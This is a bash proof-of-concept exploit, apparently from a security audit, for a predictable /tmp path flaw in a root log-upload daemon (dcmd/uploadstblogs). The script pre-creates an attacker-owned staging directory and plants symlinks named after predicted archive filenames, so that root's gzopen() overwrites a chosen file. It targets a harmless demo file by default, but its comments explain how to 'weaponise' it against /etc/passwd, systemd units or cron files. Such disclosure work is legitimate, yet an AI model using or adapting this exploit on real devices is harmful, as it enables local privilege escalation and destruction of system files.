#!/bin/bash
###############################################################################
# PoC: DCM-011 - gzopen() on predictable path under /tmp without
#                O_NOFOLLOW / O_EXCL -> arbitrary file overwrite as root
#
# CWE-377 / CWE-59  |  Component: uploadstblogs  |  Severity: High
#
# Vulnerable code (archive_manager.c:717-732):
#     const char* target_dir = output_dir ? output_dir : source_dir;   // "/tmp/DCM/"
#     snprintf(archive_path, sizeof(archive_path), "%s/%s", target_dir, archive_filename);
#     ...
#     gzFile gz = gzopen(archive_path, "wb9");   // O_WRONLY|O_CREAT|O_TRUNC, FOLLOWS SYMLINKS
#
# Filename generator (archive_manager.c:401-445):
#     strftime(timestamp, ..., "%m-%d-%y-%I-%M%p", gmtime_r(&now, ...));   // UTC, 12h clock
#     /* strip ':' from MAC */
#     snprintf(buffer, ..., "%s_%s_%s.tgz", mac_clean, "Logs", timestamp);
#     => e.g.  AABBCCDDEEFF_Logs_06-11-26-03-45PM.tgz
#
# Default target_dir (context_manager.c:344):
#     ctx->dcm_log_path = "/tmp/DCM/"   (trailing slash -> path becomes
#     "/tmp/DCM//<file>"; the double '/' collapses, so a symlink at
#     /tmp/DCM/<file> is followed.)
#
# Lifecycle (uploadlogsnow.c:320 / strategies.c:302):
#     remove_directory(dcm_log_path) is called AFTER every upload, so between
#     runs /tmp/DCM does NOT exist -> an unprivileged attacker can pre-create
#     it, OWN it (so fs.protected_symlinks does NOT apply - that sysctl only
#     guards sticky world-writable dirs, and our symlink lives in an
#     attacker-owned non-sticky subdir of /tmp), and plant symlinks inside.
#     create_directory() (file_operations.c:100) returns success if the dir
#     already exists and does NOT verify ownership.
#
# ATTACK FLOW
#   1. Attacker (any local uid with write access to /tmp) reads device MAC.
#   2. Attacker mkdir /tmp/DCM (owned by attacker).
#   3. Attacker predicts the archive filename for the next N minutes and
#      creates   ln -s <TARGET> /tmp/DCM/<predicted>.tgz   for each.
#   4. dcmd's scheduled / on-demand log upload fires as root, calls
#      gzopen("/tmp/DCM/<predicted>.tgz","wb9") -> open() follows the symlink
#      and TRUNCATES + WRITES gzip data into <TARGET>.
#
# This PoC is NON-DESTRUCTIVE: the symlink target is /tmp/PWNED_DCM-011
# (NOT /etc/passwd).  Successful exploitation is proven when that file
# appears, owned by root, beginning with the gzip magic 0x1f 0x8b.
# To weaponise, change VICTIM below to e.g. /etc/passwd or a systemd unit.
###############################################################################

set -u

#----------------------------------------------------------------------------#
# Tunables
#----------------------------------------------------------------------------#
STAGE_DIR="/tmp/DCM"                 # default ctx->dcm_log_path
VICTIM="/tmp/PWNED_DCM-011"          # SAFE demo target (root will create/clobber this)
WINDOW_MIN=15                        # plant symlinks for current minute + next 14
WAIT_SEC=$(( WINDOW_MIN * 60 ))      # how long to wait for dcmd to fire
PREFIX="Logs"                        # create_archive() hard-codes "Logs"

#----------------------------------------------------------------------------#
# 1. Determine the eSTB MAC exactly as the daemon will see it.
#    GetEstbMac() (libcommonutilities) typically returns "AA:BB:CC:DD:EE:FF";
#    generate_archive_name() then strips the ':' chars (lines 432-442).
#    Override with:  TARGET_MAC=AA:BB:CC:DD:EE:FF ./DCM-011_gzopen_tmp_symlink.sh
#----------------------------------------------------------------------------#
get_mac() {
    # a) explicit override
    if [ -n "${TARGET_MAC:-}" ]; then echo "$TARGET_MAC"; return; fi

    # b) cached eSTB MAC files used by RDK common utilities
    for f in /tmp/.estb_mac /tmp/.macAddress /opt/.macAddress; do
        [ -s "$f" ] && { tr -d ' \t\r\n' < "$f"; return; }
    done

    # c) ESTB_INTERFACE from /etc/device.properties -> /sys/class/net/<if>/address
    if [ -r /etc/device.properties ]; then
        IF=$(grep -E '^ESTB_INTERFACE=' /etc/device.properties 2>/dev/null \
             | tail -1 | cut -d= -f2 | tr -d '"' | tr -d ' \t\r\n')
        if [ -n "$IF" ] && [ -r "/sys/class/net/$IF/address" ]; then
            cat "/sys/class/net/$IF/address"; return
        fi
    fi

    # d) default-route interface (off-device fallback for lab testing)
    IF=$(ip -o route get 1.1.1.1 2>/dev/null | grep -o 'dev [^ ]*' | head -1 | cut -d' ' -f2)
    if [ -n "$IF" ] && [ -r "/sys/class/net/$IF/address" ]; then
        cat "/sys/class/net/$IF/address"; return
    fi

    # e) first non-loopback iface
    for a in /sys/class/net/*/address; do
        case "$a" in */lo/*) continue;; esac
        cat "$a"; return
    done
}

RAW_MAC=$(get_mac)
if [ -z "$RAW_MAC" ]; then
    echo "[!] Could not determine eSTB MAC. Re-run with TARGET_MAC=<mac> $0" >&2
    exit 1
fi

# Strip ':' exactly as archive_manager.c:436-441 does. Daemon does NOT change
# case, but GetEstbMac() usually returns upper-case; we plant BOTH cases to
# remove guesswork.
MAC_NOCOL=$(printf '%s' "$RAW_MAC" | tr -d ':')
MAC_UP=$(printf '%s' "$MAC_NOCOL" | tr 'a-f' 'A-F')
MAC_LO=$(printf '%s' "$MAC_NOCOL" | tr 'A-F' 'a-f')

echo "[*] DCM-011 PoC - symlink plant for gzopen() in dcmd (root)"
echo "[*] eSTB MAC          : $RAW_MAC"
echo "[*] Filename MAC forms: $MAC_UP  /  $MAC_LO"
echo "[*] Staging dir       : $STAGE_DIR"
echo "[*] Victim file       : $VICTIM   (change to /etc/passwd etc. to weaponise)"

#----------------------------------------------------------------------------#
# 2. Ensure the victim does not already exist so we can prove root created it.
#----------------------------------------------------------------------------#
rm -f -- "$VICTIM" 2>/dev/null || true

#----------------------------------------------------------------------------#
# 3. Pre-create /tmp/DCM owned by the attacker.
#    The daemon deletes this dir after every upload and re-mkdir()s it before
#    the next; mkdir() on an existing dir returns EEXIST and create_directory()
#    treats that as success WITHOUT checking st_uid -> our dir survives.
#    We make it 0777 so root's later copy_files_to_dcm_path() can write into
#    it without EACCES.
#----------------------------------------------------------------------------#
mkdir -p -- "$STAGE_DIR"
chmod 0777 -- "$STAGE_DIR" 2>/dev/null || true
echo "[*] Created attacker-owned $STAGE_DIR ($(stat -c '%U:%G %a' "$STAGE_DIR" 2>/dev/null || stat -f '%Su:%Sg %Lp' "$STAGE_DIR"))"

#----------------------------------------------------------------------------#
# 4. Plant symlinks for every minute in [now, now+WINDOW_MIN).
#    Timestamp format MUST match strftime("%m-%d-%y-%I-%M%p", gmtime_r(...)):
#      - UTC (gmtime_r)            -> we use `date -u`
#      - %m-%d-%y                  -> 06-11-26
#      - %I-%M                     -> 12-hour HOUR-MIN, zero-padded
#      - %p                        -> AM / PM  (C locale -> upper-case;
#                                     we force LC_ALL=C and ALSO plant the
#                                     lower-case variant for safety)
#
#    Total symlinks planted = WINDOW_MIN * 2(MAC case) * 2(AM/PM case)
#                           = 15 * 4 = 60 dentries -> negligible.
#----------------------------------------------------------------------------#
echo "[*] Planting $(( WINDOW_MIN * 4 )) predictive symlinks (window = ${WINDOW_MIN} min, UTC)..."

plant() {
    # $1 = mac-form, $2 = timestamp-string
    local name="${1}_${PREFIX}_${2}.tgz"
    ln -sfn -- "$VICTIM" "$STAGE_DIR/$name"
}

i=0
while [ "$i" -lt "$WINDOW_MIN" ]; do
    # GNU/coreutils & busybox both accept `-u -d "@<epoch>"`
    EPOCH=$(( $(date -u +%s) + i*60 ))
    TS_UP=$(LC_ALL=C date -u -d "@$EPOCH" '+%m-%d-%y-%I-%M%p' 2>/dev/null \
            || LC_ALL=C date -u -r "$EPOCH" '+%m-%d-%y-%I-%M%p')
    # lower-case AM/PM variant (some libc locales emit 'am'/'pm')
    TS_LO=$(printf '%s' "$TS_UP" | tr 'APM' 'apm')

    for M in "$MAC_UP" "$MAC_LO"; do
        plant "$M" "$TS_UP"
        plant "$M" "$TS_LO"
    done
    i=$(( i + 1 ))
done

echo "[*] Sample of planted links:"
ls -l "$STAGE_DIR" | grep -- '->' | head -5
echo "    ... ($(ls "$STAGE_DIR" | grep -c '\.tgz$') total)"

#----------------------------------------------------------------------------#
# 5. (Optional) Trigger the daemon.
#    The vulnerable path is reached when dcmd runs its scheduled
#    DCM_LOGUPLOAD_SCHED job (dcm.c:72-99 -> uploadstblogs_run()) or the
#    UploadLogsNow flow (uploadlogsnow.c:268 -> create_archive()).
#    There is no direct RBUS "upload now" setter exposed by dcmd itself, so
#    on a live device simply WAIT for the next scheduled upload, or restart
#    the service to force the boot-time upload.
#
#    Off-device / lab fallback: if you have root in the test env you can
#    force it with `systemctl restart dcmd` - but that defeats the point of
#    a priv-esc demo, so we just wait.
#----------------------------------------------------------------------------#
echo
echo "[*] Symlinks armed. Now waiting up to ${WAIT_SEC}s for dcmd (root) to run"
echo "    create_archive() and follow one of them into $VICTIM ..."
echo "    (To accelerate on a test rig:  systemctl restart dcmd   OR trigger"
echo "     the operator 'Upload Logs Now' action.)"
echo

#----------------------------------------------------------------------------#
# 6. Watch for proof-of-exploit.
#    Success criteria:
#      - $VICTIM exists
#      - first 2 bytes == 1f 8b   (gzip magic written by gzopen("wb9"))
#      - owner uid == 0           (proves the writer was the root daemon,
#                                   not us)
#----------------------------------------------------------------------------#
end=$(( $(date +%s) + WAIT_SEC ))
while [ "$(date +%s)" -lt "$end" ]; do
    if [ -e "$VICTIM" ]; then
        OWNER_UID=$(stat -c '%u' "$VICTIM" 2>/dev/null || stat -f '%u' "$VICTIM")
        MAGIC=$(od -An -tx1 -N2 "$VICTIM" 2>/dev/null | tr -d ' \n')
        echo
        echo "============================================================"
        echo "[+] EXPLOIT REACHED - DCM-011 CONFIRMED"
        echo "[+] $VICTIM was created via attacker symlink"
        echo "[+]   owner uid : $OWNER_UID  $( [ "$OWNER_UID" = "0" ] && echo '(root - written by dcmd)' )"
        echo "[+]   size      : $(stat -c '%s' "$VICTIM" 2>/dev/null || stat -f '%z' "$VICTIM") bytes"
        echo "[+]   magic     : 0x$MAGIC  $( [ "$MAGIC" = "1f8b" ] && echo '(gzip - from gzopen wb9)' )"
        ls -l "$VICTIM"
        echo "============================================================"
        echo
        echo "[i] In a real attack, point the symlink at /etc/passwd, a"
        echo "    systemd unit, or /etc/cron.d/* to obtain root file clobber"
        echo "    -> DoS / integrity loss / priv-esc chain."
        exit 0
    fi
    sleep 2
done

echo
echo "[-] Timed out after ${WAIT_SEC}s - dcmd did not run a log upload inside"
echo "    the prediction window. The symlinks remain in $STAGE_DIR; either"
echo "    enlarge WINDOW_MIN or manually trigger the upload and re-check"
echo "    for $VICTIM."
exit 1
